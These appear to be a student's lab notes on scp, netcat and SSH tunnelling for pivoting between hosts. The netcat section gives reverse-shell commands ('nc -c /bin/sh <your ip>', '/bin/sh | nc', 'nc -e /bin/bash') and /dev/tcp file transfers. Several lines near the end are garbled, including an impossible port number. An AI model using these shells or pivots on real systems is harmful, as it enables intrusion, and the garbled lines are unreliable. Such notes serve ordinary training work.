  SCP SYNTAX:
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      $ SCP STUDENT@172.16.82.106:SECRETSTUFF.TXT /HOME/STUDENT
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
      $ SCP SECRETSTUFF.TXT STUDENT@172.16.82.106:/HOME/STUDENT
    COPY A FILE FROM A REMOTE HOST TO A SEPARATE REMOTE HOST
      $ SCP -3 STUDENT@172.16.82.106:/HOME/STUDENT/SECRETSTUFF.TXT STUDENT@172.16.82.112:/HOME/STUDENT
  SCP SYNTAX W/ ALTERNATE SSHD:
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY:
      scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
  SCP SYNTAX THROUGH A TUNNEL:
    ssh student@172.16.82.106 -L 1111:localhost:22 -NT
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      scp -P 1111 student@localhost:secretstuff.txt /home/student
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
      scp -P 1111 secretstuff.txt student@localhost:/home/student
------------
NETCAT:
NETCAT IS THE "SWISS ARMY KNIFE" NETWORKING UTILITY WHICH READS AND WRITES DATA ACROSS NETWORK SOCKET CONNECTIONS USING THE TCP/IP PROTOCOL. 
IT IS DESIGNED TO BE A RELIABLE "BACK END" TOOL THAT CAN BE USED DIRECTLY OR EASILY DRIVEN BY OTHER PROGRAMS AND SCRIPTS.
CAN BE USED FOR THE FOLLOWING:
  INBOUND AND OUTBOUND CONNECTIONS, TCP/UDP, TO OR FROM ANY PORTS
  TROUBLESHOOTING NETWORK CONNECTIONS
  SENDING/RECEIVING DATA (INSECURELY)
  NETCAT: CLIENT TO LISTENER FILE TRANSFER:
    Client (sends file): nc 10.2.0.2 9001 < file.txt
    Listener (receive file): nc -l -p 9001 > newfile.txt
  NETCAT: LISTENER TO CLIENT FILE TRANSFER
    Listener (sends file): nc -l -p 9001 < file.txt
    Client (receive file): nc 10.2.0.2 9001 > newfile.txt
  NETCAT RELAY DEMOS:
    On Client Relay:
      mknod mypipe p
      nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
    On Listener2 (sends info):
      nc -l -p 9002 < infile.txt
    On Listener1 (receives info):
      nc -l -p 9001 > outfile.txt
    WRITES THE OUTPUT TO Listener1 AND Listener2 THROUGH THE NAMED PIPE
  FILE TRANSFER WITH /DEV/TCP:
    On the receiving box:
      nc -l -p 1111 > file.txt
    On the sending box:
      cat file.txt > /dev/tcp/10.2.0.2/1111
    THIS METHOD IS USEFUL FOR HOST THAT DOES NOT HAVE NETCAT AVAILABLE.
  REVERSE SHELL USING NETCAT:
    When shelled into the remote host using -c :
      nc -c /bin/sh <your ip> <any unfiltered port>
    YOU COULD EVEN PIPE BASH THROUGH NETCAT:
      /bin/sh | nc <your ip> <any unfiltered port>
    THEN LISTEN FOR THE SHELL:
      nc -l -p <same unfiltered port> -vvv
    YOU CAN ALSO LISTEN USING THE -e WITH NETCAT:
      nc -l -p <any unfiltered port> -e /bin/bash
------------
SSH:
  VARIOUS IMPLEMENTATIONS (V1 AND V2)
  PROVIDES AUTHENTICATION, ENCRYPTION, AND INTEGRITY.
  ALLOWS REMOTE TERMINAL SESSIONS
  USED FOR TUNNELING
  CREATED AS A SECURE REPLACEMENT FOR BERKELEY REMOTE COMMANDS:
  RSH - REPLACED WITH SSH, PROVIDES A CHANNEL FOR RUNNING A SHELL ON A REMOTE COMPUTER.
  RLOGIN - REPLACED WITH RLOGIN, PROVIDES REMOTE
  SSH PORT FORWARDING:
    CREATES CHANNELS USING SSH-CONN PROTOCOL
    ALLOWS FOR TUNNELING OF OTHER SERVICES THROUGH SSH
    PROVIDES INSECURE SERVICES ENCRYPTION
  ------
  SSH LOCAL PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
    OR:
      ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
    EXAMPLE:
    CREATES A LOCAL PORT (1111) ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE’S PORT 80.
      ssh student@172.16.82.106 -L 1111:localhost:80 -NT
    OR:
      ssh -L 1111:localhost:80 student@172.16.82.106 -NT
  SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT:
    Internet Host:
      ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
      ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
      firefox localhost:2222
      CREATES AN ADDITIONAL LOCAL PORT ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE THROUGH THE PREVIOUS CHANNEL CREATED.
  ------
  SSH DYNAMIC PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
    PROXYCHAINS DEFAULT PORT IS 9050
    CREATES A DYNAMIC SOCKS4 PROXY THAT INTERACTS ALONE, OR WITH A PREVIOUSLY ESTABLISHED REMOTE OR LOCAL PORT FORWARD.
    ALLOWS THE USE OF SCRIPTS AND OTHER USERSPACE PROGRAMS THROUGH THE TUNNEL.
  SSH DYNAMIC PORT FORWARDING 1-STEP:
    Blue Private Host-1:
    ssh student@172.16.82.106 -D 9050 -NT
    proxychains ./scan.sh
    proxychains ssh student@10.10.0.40
  SSH DYNAMIC PORT FORWARDING 2-STEP:
    Blue Private Host-1:
      ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
      ssh student@localhost -D 9050 -p 1111 -NT
      proxychains curl ftp://www.onlineftp.ch
      proxychains wget -r www.espn.com

  SSH REMOTE PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
    OR:
      ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
    EXAMPLE:
    CREATES A REMOTE PORT ON THE REMOTE’S LOCAL HOST THAT FORWARDS TO THE TARGET SPECIFIED.
      Blue Host-1
        ssh student@10.10.0.40 -R 1111:localhost:80 -NT
  SSH REMOTE AND LOCAL PORT FORWARDING (EXAMPLE AS FOLLOWS):
    Blue Private Host-1:
      ssh student@172.16.82.106 -R 1111:localhost:22 -NT
    Internet Host:
      ssh student@172.16.82.106 -L 2222:localhost:1111 -NT

LOCAL SSH PORT FORWARDING: ONE PORT OPENED ON YOUR MACHINE! EXAMPLE: 
SSH ON PORT 1000, BUT PO41700:localhost:41700RT 22 BLOCKED: 
- DEPENDS ON WHERE BLOCKED
- SSH AND PORT FORWARDING ARE NOT EQUIVALENT CONCEPTS
--SSH FUNCTIONALITY:
-PORT CONVENTION - 41700-41799
-RECOMMENDED PATTERN: LOCAL PORT FORWARDS, START LOW, REMOTE, START HIGH

ssh -L 421700:127.0.0.1:80 user@tobias -NT A COMMAND BEING SENT TO TOBIAS HOST
wget -r 127.0.0.1:41700 ACTUALLY OCCURING ON THE LOCAL HOST
ssh

ssh user@tobias -L 42100:colby_ip:22 -NT
IN ORDER TO ACCESS COLBY, USE LOCAL PORT 42100 IN THIS EXAMPLE
ALWAYS BOUND TO AND ONLY TO LOOPBACK ON LOCAL HOST!
